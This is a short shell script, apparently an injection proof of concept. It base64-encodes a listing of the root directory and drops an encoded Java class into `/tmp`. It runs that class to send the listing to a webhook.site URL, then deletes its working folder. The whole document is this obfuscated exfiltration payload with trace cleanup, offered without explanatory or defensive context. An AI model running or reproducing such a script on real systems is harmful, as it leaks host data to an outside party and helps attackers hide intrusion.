WEBHOOK="https://webhook.site/26d32c6f-d35a-4605-b495-6283871b5009"
COMMAND=$(ls -la / | base64 -w 0)


AGENT="yv66vgAAADcAIQoABwASBwATCgACABQKAAIAFQoAFgAXBwAYBwAZAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABG1haW4BABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAKRXhjZXB0aW9ucwcAGgEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMAAgACQEADGphdmEvbmV0L1VSTAwACAAbDAAcAB0HAB4MAB8AIAEABE1haW4BABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEADm9wZW5Db25uZWN0aW9uAQAaKClMamF2YS9uZXQvVVJMQ29ubmVjdGlvbjsBABZqYXZhL25ldC9VUkxDb25uZWN0aW9uAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwAhAAYABwAAAAAAAgABAAgACQABAAoAAAAdAAEAAQAAAAUqtwABsQAAAAEACwAAAAYAAQAAAAkACQAMAA0AAgAKAAAAOgAEAAMAAAAWuwACWSoDMrcAA0wrtgAETSy2AAVXsQAAAAEACwAAABIABAAAABoACwAbABAAHAAVAB0ADgAAAAQAAQAPAAEAEAAAAAIAEQ=="
FOLDER="/tmp/1nj3ctioN"

mkdir -p $FOLDER
echo $AGENT | base64 -d > $FOLDER/Main.class
cd $FOLDER
java Main "${WEBHOOK}/?q=${COMMAND}"
rm -rf $FOLDER